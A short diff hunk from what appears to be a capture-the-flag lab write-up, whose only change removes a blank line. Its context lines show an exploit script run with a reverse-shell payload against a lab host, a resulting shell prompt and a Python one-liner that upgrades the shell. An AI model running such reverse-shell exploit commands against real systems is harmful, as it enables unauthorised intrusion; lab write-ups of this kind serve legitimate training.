@@ -131,7 +131,6 @@ $ ./34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.33 lport=9002 page
 10.10.10.56> 
 ```
 
-
 upgrading shell
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
